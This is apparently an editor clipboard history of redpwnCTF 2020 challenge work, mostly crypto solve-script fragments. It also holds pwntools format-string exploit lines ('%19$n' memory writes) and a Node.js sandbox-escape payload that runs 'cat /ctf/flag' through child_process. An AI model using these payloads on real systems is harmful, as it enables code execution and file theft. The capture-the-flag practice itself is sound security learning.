3521327de9e07525dade07159dd8e972|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|34|1|V|python
	for c in pt:
	    char += c
	    n = int(char, 2)
	    if n in range(2**6,2**7):
	        dec += chr(n)
	        char = ''
1ea22ef558de8ef12235f5228b7c84d0|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|4|1|V|python
	i = 2**ct_len
62cc43ed79dd15512331c43a8505b069|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|4|1|V|python
	j = i + 1
2102c24ca1bcd60aeb6e63b3ae205c0f|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|3|1|v|python
	ct_len
1a07a8e68a514892eca1dd54382d5abe|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|12|1|V|python
	pt = ''
b468b5af746fc670ee46ec9f972225b3|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|14|1|V|python
	        c = chr(c)
	        if i % 17 == 0:
	            if c == '1':
	                pt += '0'
	            else: 
	                pt += '1'
	        elif i % 17 == 16:
	            pt += '0'
	        else:
	            if c == '1':
	                pt += '1'
	            else: 
	                pt += '0'
b53e6cd6abc9a0d9e1995f0f487faac5|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|15|9|V|python
	        print(c)
270053af0dccedb13c150d610b04eadf|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|22|1|V|python
	pt = '1101101010100110010101110000110101111001011101011000110110101010101011011000100101010101111110110001001101110011100011101101110111010100101011101100001111010010101110010101110101101111110110001111010000010111100110110110011101110110110110010001100100001101000111101111111000010111010111100100100101101'
c7d476009dcdf50d90f701c356dbfcad|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|17|1|V|python
	                if c == '1':
	                    pt[i] = '0'
	                else:
	                    pt[i] = '1'
154730d5ce88d95eac9c10abdaa0c35a|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|30|1|V|python
	print(''.join(pt))
ec092011c1ed9aebbc093ec25f3ee8e9|file:///home/neo/CTFs/redpwn2020/shades/pt.txt|1|1|V|text
	86 91 82 87 102 39 99 43 97 97 42 93 39 811 3
b59db0f3820694dec683ef2c950ca511|file:///home/neo/CTFs/redpwn2020/shades/pt.txt|1|1|V|text
	86 9c 81 87 a3 49 99 43 97 97 41 92 49 7b 41 97 7b 44 92 7b 44 95 98 a5
f10157ddb3faf17be617c05f0480f85f|file:///home/neo/CTFs/redpwn2020/shades/pt.txt|1|1|V|text
	86 9c 81 87 a3 49 99 43 97 97 41 92 49 7b 41 97 7b 44 92 7b 44 96 98 a5
a58dfbf769b05a90648e6c445bd12698|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|54|1|V|python
	# Set up format string to leak address
	io.recvuntil('Name: ')
	io.sendline('a' * OFFSET + "%x%x")
	io.sendlineafter('> ', '2')
	line = io.recvline()[:-1]
	log.info(line)
	cmd_addr = int(line[-8:], 16)
	log_addr("Cmd + 48", cmd_addr)
	base_addr = cmd_addr - 48 - CMD_OFFSET
	log_addr("Base", base_addr)
	
	# Change name to write byte with format string
	io.sendlineafter('> ', '1')
	io.recvuntil('Name: ')
	io.sendline(b'a' * OFFSET + b"%19$n") # !!
	io.sendlineafter('> ', '2')
	
	# io.sendlineafter('> ', '0')
bac5f60315cf7d40692a85834b96c3dd|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|51|1|V|python
	OFFSET = 25
190086bd81b991a2488e47cbb6bb7744|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|48|1|V|python
	WIN_ADDR = exe.sym.win
	CMD_OFFSET = exe.sym.cmd
b3dfbb372aaf0558cbb841489803e1f3|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|50|1|V|python
	io.sendline('\x01\x02\x03\x04')
def682620f8a9902ac4ef0ca60ccfd97|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|51|14|v|python
	\x01\x02\x03\x04
af89d05c9a06c37756ea69d6dbdf1fd9|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|51|1|V|python
	io.sendline('1')
679720a95980b8c0585ce627d7caa9b2|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|50|1|V|python
	# io.sendline('\x01\x02\x03\x04')
4608cd92bc27283844896b29578a8a47|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|58|1|V|python
	io.sendline('8')
97da163c0279f77d6550f6ac18ffe08d|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|59|1|V|python
	io.sendline('8')
	io.sendline('7')
	io.sendline('6')
ca1b1d6f4a73b6200659b7151f5df01b|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|63|1|V|python
	io.sendline('8')
	io.sendline('7')
e5590a10f44bad4165d31b786adfe4b3|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|10|22|v|python
	svc.pwnable.xyz
5e1befcdbf6a90601cbe3f8c20e2200d|file:///home/neo/CTFs/redpwn2020/bubbly/exploit.py|11|25|v|python
	30010
f13ba9a356f85d82752ff09f2c9103de|file:///home/neo/CTFs/redpwn2020/shades/pt.txt|2|1|V|text
	75 8b 70 76 92 38 88 32 86 86 30 81 38 6a 30 86 6a 33 81 6a 33 85 87 94
a04de0644fa30d9cf71e2fe0ab81b5f8|file:///home/neo/CTFs/redpwn2020/primmity/primimity-public-key.txt|1|1|V|text
	n: 2739699434633097765008468371124644741923408864896396205946954196101304653772173210372608955799251139999322976228678445908704975780068946332615022064030241384638601426716056067126300711933438732265846838735860353259574129074615298010047322960704972157930663061480726566962254887144927753449042590678730779046154516549667611603792754880414526688217305247008627664864637891883902537649625488225238118503996674292057904635593729208703096877231276911845233833770015093213639131244386867600956112884383105437861665666273910566732634878464610789895607273567372933766243229798663389032807187003756226177111720510187664096691560511459141773632683383938152396711991246874813205614169161561906148974478519987935950318569760474249427787310865749167740917232799538099494710964837536211535351200520324575676987080484141561336505103872809932354748531675934527453231255132361489570816639925234935907741385330442961877410196615649696508210921
b7506b072410cddf7da0b69c3b26c0a5|file:///home/neo/CTFs/redpwn2020/primmity/solve.py|5|1|V|python
	print(i.bit_length())
8dc0fb6d2ccfad383386877aadc391f9|file:///home/neo/CTFs/scripts/crypto/fermat_factorization.sage|4|1|V|python
	# n = 383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051
8d8908da2f85eb81cc3b1da02d1ac1a8|file:///home/neo/CTFs/redpwn2020/primmity/solve.py|3|1|V|python
	n = 2739699434633097765008468371124644741923408864896396205946954196101304653772173210372608955799251139999322976228678445908704975780068946332615022064030241384638601426716056067126300711933438732265846838735860353259574129074615298010047322960704972157930663061480726566962254887144927753449042590678730779046154516549667611603792754880414526688217305247008627664864637891883902537649625488225238118503996674292057904635593729208703096877231276911845233833770015093213639131244386867600956112884383105437861665666273910566732634878464610789895607273567372933766243229798663389032807187003756226177111720510187664096691560511459141773632683383938152396711991246874813205614169161561906148974478519987935950318569760474249427787310865749167740917232799538099494710964837536211535351200520324575676987080484141561336505103872809932354748531675934527453231255132361489570816639925234935907741385330442961877410196615649696508210921
e0f94f0cec197421738291fadd73f11b|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|5|1|V|python
	s = a**3 - n
f18b15d4124d112e75a4ecc581254831|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|5|1|V|python
	b = s.nth_root(3, truncate_mode=1)[0]
d3f1c1261c87c894300881dce9afbe5e|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|5|1|V|python
	p = a+b
03cdae1a349cb38ff38e39c8494f97db|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|5|1|V|python
	# assert n % p == 0
d1d3244ff88d7a15800991164fc685b5|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|5|1|V|python
	print(is_prime(p))
688543b8ac4831e3f7c9212cd20efb8e|file:///home/neo/CTFs/scripts/crypto/fermat_factorization.sage|3|1|V|python
	n = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091
4bc33b288c8e5843c86607d022785ca6|file:///home/neo/CTFs/redpwn2020/primmity/dec.sage|12|1|V|python
	print(n/p)
5d8d6178c308367768683534c86bf510|file:///home/neo/CTFs/redpwn2020/primmity/primimity-public-key.txt|3|4|v|text
	
20f68f243513d91858f378d9213325b8|file:///home/neo/CTFs/redpwn2020/caasino/solve|2|1|V|
	process.mainModule.require('child_process').execSync('cat /ctf/flag').toString()`
4d741c21381296b04610f78e4ddedc6a|file:///home/neo/CTFs/redpwn2020/caasino/solve|1|1|V|
	`const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /ctf/flag').toString()`
fb851901403a193f00530fa60d2e3bf4|file:///home/neo/CTFs/redpwn2020/caasino/solve|1|2|v|
	const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /ctf/flag').toString()
53fbf7d407e91beb158a46c09da1081b|file:///home/neo/CTFs/redpwn2020/caasino/solve|1|2|v|
	const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
e27e46624c027241eeb413454b1494db|list:/diagnostics|2|1|V|list
	calculator.js:1:12	Information	[tsserver 80001] File is a CommonJS module; it may be converted to an ES6 module.
db85bbfcf81f5a84e694675001c07db0|file:///home/neo/CTFs/redpwn2020/caasino/solve|1|1|V|
	`const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()`
4affc72d4718398ecea958c8d1c7b338|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|14|5|V|python
	    keys[i] = 0
467443adb988e03ca2d0df1a1f39420f|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|19|1|V|python
	for i in range(256):
c96c2f029c1d7394f7126cb98a155b11|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|20|2|V|python
	    for i in range(256):
57aa36005ebc9d82a0752fd5987a72ce|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|26|1|V|python
	print(keys)
24059cf2a16d67db0a0a889f0b90d48d|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|28|26|v|python
	Frequency 
003d7c21fe03b97c29f44b8846f0f6c2|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|28|30|v|python
	Character 
e013bcdd5be4dbf90627fb3ffef3968d|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|8|1|V|python
	overlapping = []
5c53b4d0771f2cb6f07f2191b4657827|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|8|1|V|python
	first = []
08849e9e90c4749fb916e9b7bbdd75ba|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|9|1|V|python
	    if i % big_key_size == 0 and i % big_key_size == 0:
	        overlapping.append(encrypted[i:i+big_key_size])
	        first.append(encrypted[i])
5394118336852398541925dfecad5ad5|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|8|1|V|python
	for i, c in enumerate(encrypted):
8b4ccbc06db55f91db46f58bb5804783|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|12|5|V|python
	    for j in range(256):
880411a0f5b556b89825e3bbe57a8ee1|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|12|9|V|python
	        pos.append(0)
9cb6cb2aedb01f0e5165a7ec87ec541e|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|12|5|V|python
	    keys[i] = pos
139deba14132cb3e6cb6627978daaeb9|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|13|9|V|python
	        keys(pos)
95b7f89d0485fafbb38f5b10fabac61c|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|15|25|V|python
	for key,val in keys.items():
	    print(key,val)
b763260ed503620f8967b422debb129f|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|15|1|V|python
	# for sentence in overlapping:
	#     for pos, letter in enumerate(sentence):
	#         for c in range(256):
	#             x = c ^ letter
	#             if x == 481:
	#                 keys[pos][c] += 1
	
b085aa3ac87c8b98cc442d88ec905247|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|22|1|V|python
	    pos_a = (pos_a + 1) % small_key_size
35452645221ca5a8b42b11ca43b29a51|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|28|1|V|python
	    print('Position: {}, Character {}, Frequency {}'.format(key , val.index(most_freq), most_freq))
bdf9fd8a750aea0576df9158f2bac984|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|29|38|v|python
	, Frequency {}
40420a0604119899e15d56bd0def3a06|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|29|73|v|python
	, most_freq
90080429f45436db7c9cc9670ff37bd5|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|9|1|V|python
	for i in range(small_key_size):
	    for j in range(big_key_size):
	        pos = (i,j)
	        chars = [0] * 256
	        keys[pos] = chars
9e3565edde8ac3b9ff4ba51fc4d13226|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|30|9|V|python
	        chars = [0] * 256
2401b05b18590ad98d21e1aa91cff190|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|33|5|V|python
	    most_freq = max(val)
e50fd832e9803c8a5ee1167da7df5945|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|33|5|V|python
	    # print('Position: {}, Character {}, Frequency {}'.format(key , val.index(most_freq), most_freq))
1eeb1301ff6a55f47d35059cbe59e1b1|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|33|56|v|python
	.index(most_freq
fe7d6d14a08b2e5e133f8184c8b0b2a8|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|32|1|V|python
	small_key = ['?'] * small_key_size
78ef52a669023544446b23e74a82fd2c|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|32|21|V|python
	small_key = ['?'] * small_key_size
	big_key = ['?'] * big_key_size
7bea7595d3c731728d85e1d2ffc72e59|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|48|1|V|python
	print(''.join(small_key))
d83fea8bafdf17b256235a7a27295bf9|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|40|23|V|python
	for i in range(small_key_size):
	    for key, val in most_freq.items():
	        if key[0] == i:
	            x = chr(val ^ ord('_'))
	            if x in string.ascii_letters:
	                small_key[i] = '_'
	                big_key[key[1]] = x
	
	print(''.join(small_key))
	print(''.join(big_key))
08cba2d7aa38804be4eed3bebb89083c|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|42|5|V|python
	        correct = True
4c7163c04af89d391efdf5646d7fd334|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|49|39|V|python
	        for pos in range(big_key_size):
	        # big_key[key[1]] = x
8f35c9b1c83d7adc377babdbeefa6a07|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|50|9|V|python
	        # big_key[key[1]] = x
6fd87b8abd82b3bfde7d19bfa09224a2|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|50|13|V|python
	            x = chr()
0888f7f9a359560ad5ce5bb983705f48|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|40|1|V|python
	for i in range(small_key_size):
	    correct = True
	    for key, val in most_freq.items():
	        if key[0] == i:
	            x = chr(val ^ ord('_'))
	            if x not in string.printable:
	                correct = False
	    if correct:
	        small_key[i] = '_'
	        for pos in range(big_key_size):
	            v = most_freq.get((i, pos))
	            x = chr(v ^ ord('_'))
	            if x in string.printable:
	                big_key[pos] = x
80e9dfd6638d4bc1240d85bf919f1f05|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|54|1|V|python
	            masked_file_name = "".join([
	                chr(
	
	                    (((c - ord("0") + i) % 10) + ord("0"))
	                    * int(chr(c) not in string.ascii_lowercase)
	
	                    + (((c - ord("a") + i) % 26) + ord("a")) 
	                    * int(chr(c) in string.ascii_lowercase)
	
	                    ) 
	
	                for c, i in zip([ord(a) for a in password], range(0xffff))
63c693037214700827aac73686dc9316|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|54|1|V|python
	            masked_file_name = "".join([
	                chr(
	
	                    (((c - ord("0") + i) % 10) + ord("0"))
	                    * int(chr(c) not in string.ascii_lowercase)
	
	                    + (((c - ord("a") + i) % 26) + ord("a")) 
	                    * int(chr(c) in string.ascii_lowercase)
	
	                    ) 
	
	                for c, i in zip([ord(a) for a in password], range(0xffff))
	                ])
c65c2568a6779a90cb9f8951b88d4dcb|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|13|1|V|python
	def rc4(text, key): # definitely not stolen from stackoverflow
	    S = [i for i in range(256)]
	    j = 0
	    out = bytearray()
	
	    #KSA Phase
	    for i in range(256):
	        j = (j + S[i] + key[i % len(key)].num) % 256
	        S[i] , S[j] = S[j] , S[i]
	
	    #PRGA Phase
	    i = j = 0
	    for char in text:
	        i = ( i + 1 ) % 256
	        j = ( j + S[i] ) % 256
	        S[i] , S[j] = S[j] , S[i]
	        out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
	
	    return out
813aa7b29462978be2d926be08f4b198|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|5|1|V|python
	class KeyByteHolder(): # im paid by LoC, excuse the enterprise level code
	    def __init__(self, num):
	        assert num >= 0 and num < 256
	        self.num = num
	
	    def __repr__(self):
	        return hex(self.num)[2:]
20b687a10af5d0b2e94fafaa05e44f43|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|36|1|V|python
	flag = itertools.cycle(bytearray(open("flag.txt").read().strip(), "utf-8"))
cff00709c095e0fed777bcf7352e437d|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|36|1|V|python
	flag = b'flag{12}'
67df41a5238e34651777087aebfed8c7|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|36|34|v|python
	open("flag.txt").read().strip()
41226d0bbe1a564ac36c7ee4e80874d9|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|33|1|V|python
	def take(iterator, count):
	    return [next(iterator) for _ in range(count)]
a2479118ff013c374e35542145ee5087|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|37|1|V|python
	def generate_key():
	    key = [KeyByteHolder(0)] * 8 # TODO: increase key length for more security?
	    for i, c in enumerate(take(flag, 8)): # use top secret master password to encrypt all passwords
	        key[i].num = c
	    return key
3e4066c0bf64422faa71634d0707f1a5|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|43|1|V|python
	print(masked_file_name)
1ec1fe7060d435ebd6e5616ce7ea4238|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|44|1|V|python
	flag = itertools.cycle(bytearray('flag{12}', "utf-8"))
efe431ad2ae7a14596c91935886d70f1|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|23|5|V|python
	    print ''.join(out)
9a4f5a5ef367692b121000002c5ba1e4|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|44|1|V|python
	    S = [i for i in range(256)]
352be349efa2639e57c9d528367102fd|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|6|5|V|python
	    S = range(256)
5335ee8001615e0ffe0c4d9ede680d3b|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|43|1|V|python
	def rc4(text, key): # definitely not stolen from stackoverflow
	    S = [i for i in range(256)]
	    j = 0
	    out = bytearray()
	
	    #KSA Phase
	    for i in range(256):
	        j = (j + S[i] + key[i % len(key)].num) % 256
	        S[i] , S[j] = S[j] , S[i]
	
	    #PRGA Phase
	    i = j = 0
	    for char in text:
	        i = ( i + 1 ) % 256
	        j = ( j + S[i] ) % 256
	        S[i] , S[j] = S[j] , S[i]
	        out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
	
4b874c3597b55fcb59800c009a0e6588|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|43|1|V|python
	def rc4(text, key): # definitely not stolen from stackoverflow
	    S = [i for i in range(256)]
	    j = 0
	    out = bytearray()
	
	    #KSA Phase
	    for i in range(256):
	        j = (j + S[i] + key[i % len(key)].num) % 256
	        S[i] , S[j] = S[j] , S[i]
	
	    #PRGA Phase
	    i = j = 0
	    for char in text:
	        i = ( i + 1 ) % 256
	        j = ( j + S[i] ) % 256
	        S[i] , S[j] = S[j] , S[i]
	        out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
	
	    return out
	
87662acb8f4858c4e370c59b2316c4e8|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/worst_pw_manager.py|1|1|V|python
	import itertools
	import string
	import pathlib
4b2655c3cd7bc47ebd8f48819befcfc4|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|6|28|v|python
	os.getcwd()
b9cb52c9cba749d69cd94e1644578641|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|8|8|V|python
	       print(filename)
2cbe4f66ce7e6448adb73211e0f6b869|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|12|8|V|python
	       print(idx, enc_pass)
0d2798462d208b2afcde1c059bb25d1e|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|25|1|V|python
	def rc4_dec(text, key):
	    S = [i for i in range(256)]
	    j = 0
	    out = bytearray()
	
	    #KSA Phase
	    for i in range(256):
	        j = (j + S[i] + key[i % len(key)] ) % 256
	        S[i] , S[j] = S[j] , S[i]
	
	    #PRGA Phase
	    i = j = 0
	    for char in text:
	        i = ( i + 1 ) % 256
	        j = ( j + S[i] ) % 256
	        S[i] , S[j] = S[j] , S[i]
	        out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
	
	    return(out)
de71fdef5842e2f601a42df92013d8b3|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|35|1|V|python
	               x = chr(((ord(c) - ord('a') - i) % 26) + ord('a'))
5fba45e50231f52992efb371d3f528b5|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|34|9|V|python
	        x = ''
e4716f08a4b8bcfab69d3c2230e3b572|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|74|1|V|python
	for c in string.printable:
	    enc2 = rc4_dec(password, bytearray(c*8, 'utf-8'))
	    if enc == enc2:
	        print(c)
fa7fe3c6255d09aa3dfd6169c7dc9272|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|46|5|V|python
	        print(password)
fe09359b7711b826d49ada15a3dac96a|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|32|9|V|python
	        print(f.read())
27ca3a1c16ee7fcee448b8e1277ddda5|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|33|9|V|python
	        print(enc_data)
22633b67e0f757764fb552f2f054c95f|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|31|9|V|python
	        print(idx)
8fef11f7e3a238bd956a6c67fb07af42|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|69|1|V|python
	k = generate_key()
	print(k)
cd7786fa72c5733f367c2a7ad2adb22b|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|69|1|V|python
	k = generate_key()
	print(k)
	k = generate_key()
	print(k)
bb93cfdad75545bcd56ca18ce05111bd|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|69|1|V|python
	print(flag)
efc9d834e5e9ad5750efbbed7b1037b3|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|69|11|V|python
	while True:
	    print(next(flag))
25d55ad283aa400af464c76d713c07ad|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|56|40|v|python
	12345678
53431813129fbf6691198b15cc69a4e0|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|71|1|V|python
	print(chr(k[0]))
08f5f3201468b6684cff4089e802cc3d|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|71|1|V|python
	print(chr(k[0].num))
5139bbefaad9c48874984167a1c605e2|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|59|1|V|python
	    for i, c in enumerate(take(flag, 8)): # use top secret master password to encrypt all passwords
	        key[i].num = c
1f16d8ad6ed78df74706f5950b402309|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|70|5|V|python
	    key[i].num = c
37e020d7a5218a459352225b16c43e32|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|63|1|V|python
	    print(key[0])
62313f7e496c5675234e15e04f01280f|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|60|9|V|python
	        print(hex(c))
01221f56d2a6fac5f61cf3f2e3c9936b|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/test.py|61|9|V|python
	    print(key)
	    print(key[0])
	    print(key[1])
09572f4f683e9085f0a7db71dd962fc7|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|50|13|V|python
	            decrypted[idx] = c
d019933814ad19156bd46bef338f78e5|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|54|1|V|python
	print(sorted(indexes))
9097cce431901cc7d68f8a9fb14cea99|file:///home/neo/CTFs/redpwn2020/worst-pw-manager/solve.py|54|1|V|python
	print(''.join(decrypted))
191faa7b380548e73ac51bcd2712803a|file:///home/neo/CTFs/redpwn2020/ratification/server.py|2|1|V|python
	import numpy as np
	from Crypto.Util.number import *
	from random import randint
	
	flag = open('flag.txt','rb').read()
	
	p = getPrime(1024)
	q = getPrime(1024)
	n = p*q
ede53c50733fe5196c2a4b8802f09b5b|file:///home/neo/CTFs/redpwn2020/ratification/server.py|2|1|V|python
	import numpy as np
	from Crypto.Util.number import *
	from random import randint
91e53ed4c3c4463f226990fb7049b0c8|file:///home/neo/CTFs/redpwn2020/ratification/server.py|8|1|V|python
	p = getPrime(1024)
	q = getPrime(1024)
	n = p*q
	e = 65537
e76009779d7631acc8eb10e3ce8308f7|file:///home/neo/CTFs/redpwn2020/ratification/server.py|33|1|V|python
			n1 = [randint(0,11) for _ in range(29)]
			n2 = [randint(0,2**(max(p.bit_length(),q.bit_length())-11)-1) for _ in range(29)]
			a = sum(n1[i]*n2[i] for i in range(29))
f065a56b1c09747505f6689481983a7b|file:///home/neo/CTFs/redpwn2020/ratification/server.py|37|1|V|python
			enc = [pow(msg,i,n) for i in n2]
a1771904224da9e664bf5448e4b380c7|file:///home/neo/CTFs/redpwn2020/ratification/server.py|38|1|V|python
			P = np.prod(list(map(lambda x,y: pow(x,y,p),enc,n1)))
			Q = np.prod(list(map(lambda x,y: pow(x,y,q),enc,n1)))
d3d36f2a22938a9c51a6184f135b1a14|file:///home/neo/CTFs/redpwn2020/ratification/server.py|38|24|v|python
	lambda x,y: pow(x,y,p),enc,n1
10883b6e1b9b29430640dd01e8aebaa7|file:///home/neo/CTFs/redpwn2020/ratification/server.py|38|20|v|python
	map(lambda x,y: pow(x,y,p),enc,n1)
e5bbab984b990169f57d48b6a6b8a358|file:///home/neo/CTFs/redpwn2020/ratification/server.py|38|15|v|python
	list(map(lambda x,y: pow(x,y,p),enc,n1))
2de4fb9bddcc672a72d02430b791f1fe|file:///home/neo/CTFs/redpwn2020/ratification/server.py|42|1|V|python
			sig1 = b%(p-1)+randint(0,q-2)*(p-1)
			sig2 = b%(q-1)+randint(0,p-2)*(q-1)
0dac445001e970f5af2368b4499a1706|file:///home/neo/CTFs/redpwn2020/ratification/server.py|46|1|V|python
			sp = pow(msg,sig1,n)*P%p
			sq = pow(msg,sig2,n)*Q%q
			s = (q*inverse(q,p)*sp + p*inverse(p,q)*sq) % n
1bcd75c529b893c534508f4d710a976c|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|5|1|V|python
	count = 0
75657f01139cc18ac90646578a043536|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|7|5|V|python
	    count += 1
740d146962c788e8b0c4561cc458ed04|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|11|5|V|python
	    ranges[(l,r)] = v
af78ecb5e2efd8e91031b808b6ad36c5|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|22|13|V|python
	            print((l,r), rang)
e99c79dc0a2d70a82964b3916632e18d|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|9|9|V|python
	    print(count)
	    count += 1
c61f85b35202f2d9d71855bf60a5c777|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|7|1|V|python
	count = 1
02750c385452cb20cb35dea0f499a91d|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|19|1|V|python
	            if r == right_limit - 1:
7a9f2474543239d6aafd9f3e6a27b2ef|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|20|1|V|python
	                password[right_limit] = v ^ value
7c7deafeee591510c8ac315b24fc66a2|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|22|26|v|python
	right_limit
1b2f767574a3e575ddcbe96127fd7e70|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|27|1|V|python
	    for rang, val in ranges.items():
	        l_rang = rang[0]
	        r_rang = rang[1]
